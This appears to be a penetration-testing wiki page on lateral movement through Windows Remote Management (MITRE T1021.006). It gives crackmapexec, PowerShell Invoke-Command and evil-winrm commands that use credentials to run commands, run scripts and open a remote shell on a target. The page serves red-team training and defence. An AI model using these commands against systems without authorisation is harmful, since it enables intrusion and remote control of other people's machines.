---
description: >-
  MITRE ATT&CK™  Remote Services: Windows Remote Management   - Technique
  T1021.006
---

# WinRM

## Theory

Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.

WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).[\[1\]](http://msdn.microsoft.com/en-us/library/aa384426) It may be called with the `winrm` command or by any number of programs such as PowerShell.[\[2\]](https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2) WinRM can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).[\[3\]](https://msdn.microsoft.com/en-us/library/aa394582.aspx)

## Practice

### Execute Remote Commands

{% tabs %}
{% tab title="UNIX-like" %}
We can use [crackmapexec](https://github.com/mpgn/CrackMapExec) to remotely execute a command on the target over WinRM.

```bash
#Execute command
crackmapexec winrm <IP> -u <user> -p <password> -x "whoami"

#Execute PowerShell command
crackmapexec winrm <IP> -u <user> -p <password> -x "$(Get-WMIObject -class Win32_ComputerSystem | select username).username"
```
{% endtab %}

{% tab title="Windows" %}
We can use PowerShell's `Invoke-Command` to remotely execute a command on the target over WinRM.

```powershell
#Create Powershell PSCredential object
$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

#Invoke command remotly
Invoke-Command -Computername <TARGET> -Credential $credential -ScriptBlock {whoami}

#Invoke command remotly from functions of your current PS console (like imported modules)
Invoke-Command -ComputerName <TARGET> -Credential $credential -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```

You may also run scripts using WInRM

```powershell
Invoke-Command -ComputerName <TARGET> -FilePath C:\path\to\script\file -credential $credential
```
{% endtab %}
{% endtabs %}

### Remote shell

{% tabs %}
{% tab title="UNIX-like" %}
[Evil-winrm](https://github.com/Hackplayers/evil-winrm) can be use to obtain a winrm powershell session

```bash
evil-winrm -u <user> -p <password> -i <IP>
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://attack.mitre.org/techniques/T1021/006/" %}
